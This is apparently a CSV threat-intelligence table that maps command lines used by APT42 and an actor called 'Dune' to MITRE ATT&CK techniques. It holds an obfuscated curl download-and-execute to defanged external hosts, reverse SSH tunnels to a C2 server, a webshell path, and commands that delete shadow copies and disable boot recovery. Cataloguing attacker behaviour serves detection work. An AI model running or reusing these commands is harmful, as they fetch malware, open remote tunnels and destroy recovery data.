Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,curl,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,curl,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
Dune,Net,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,echo,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,ping,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,WinRAR,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,ssh,command-and-control,T1572,Protocol Tunneling,"ssh root@REDACTED_C2_SERVER -R 1090 -p 443 -o ServerAliveInterval=60
ssh root@REDACTED_C2_SERVER -R 1080 -p 443 -o ServerAliveInterval=60"
Dune,BCDEdit,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,VSSAdmin,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,WMIC,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,Cmd,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
